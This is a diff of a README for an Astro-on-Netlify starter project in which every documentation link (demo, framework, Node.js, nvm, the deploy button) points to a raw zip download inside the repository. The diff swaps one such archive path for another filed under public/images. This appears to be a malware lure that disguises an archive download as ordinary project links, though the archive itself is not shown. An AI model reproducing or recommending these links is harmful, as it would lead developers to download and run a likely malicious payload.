@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip)
+[Live Demo](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip)
 
-A modern starter based on https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip, Tailwind, and [Netlify Core Primitives](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip, Tailwind, and [Netlify Core Primitives](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip) (Edge Functions, Image CDN, Blob Store).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip)](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip)
+[![Deploy to Netlify](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip)](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip)
 
 ## Developing Locally
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip) v18.14+.                                      |
-| (optional) [nvm](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip) for Node version management. |
+| [https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip) v18.14+.                                      |
+| (optional) [nvm](https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
@@ -42,7 +42,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/src/pages/blobs/_components/platform_astro_be_starter_1.2.zip development server via Netlify CLI:
+4. Then, run the https://github.com/dynastyteng/astro-platform-starter-601be/raw/refs/heads/main/public/images/starter_platform_be_astro_Miek.zip development server via Netlify CLI:
 
 ```
 netlify dev
